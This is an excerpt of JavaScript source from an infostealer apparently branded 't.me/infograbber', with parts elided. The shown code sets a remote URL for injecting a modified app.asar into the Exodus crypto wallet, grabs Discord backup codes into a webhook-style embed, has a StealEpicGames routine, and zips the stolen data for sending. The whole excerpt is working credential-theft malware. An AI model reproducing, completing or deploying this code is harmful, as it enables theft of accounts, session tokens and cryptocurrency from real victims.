...
const exodusInjectionUrl = "https://d.skids.rip/download/app.asar";
        ...
        if (currentFile === 'discord_backup_codes.txt') {
          ...
          try {
            ...
            const embed = {
              ...
              footer: {
                text: `${user.hostname} t.me/infograbber`,
...
async function StealEpicGames() {
    try {
        ...
        if (fs.existsSync(epicPath)) {
            ...
            const howToUseContent = `<================[t.me/infograbber Stealer]>================>\n\n
...
async function archiveAndSendData() {
    ...
    try {
        ...
        archive.addZipComment('All the Information was Stealed by t.me/infograbber');
